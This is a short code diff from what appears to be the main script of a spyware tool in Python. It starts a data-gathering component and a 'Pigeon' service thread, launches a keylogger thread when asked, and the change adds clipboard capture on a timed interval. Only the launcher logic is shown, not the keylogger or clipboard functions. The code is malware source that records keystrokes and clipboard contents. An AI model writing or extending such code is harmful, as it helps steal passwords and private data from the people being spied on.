@@ -31,13 +31,17 @@ if __name__ == "__main__":
     update(argline=sys.argv[1:])
     makeConfig()
     Gatherer()
-    pInstance = Thread(target=Pigeon.startService)
-    pInstance.start()
+    Thread(target=Pigeon.startService).start()
     try:
         if PARAM.get("keylogger") != None:
             klInstance = keylogger()
             klThread = Thread(target=klInstance.startService)
             klThread.start()
+        if PARAM.get("clipboard") != None:
+            if PARAM.get("interval") != None:
+                METHODS["clipboard"](int(PARAM["interval"]))
+            else:
+                METHODS["clipboard"]()
     except KeyboardInterrupt:
         Pigeon.stopService()
         klInstance.stopService()
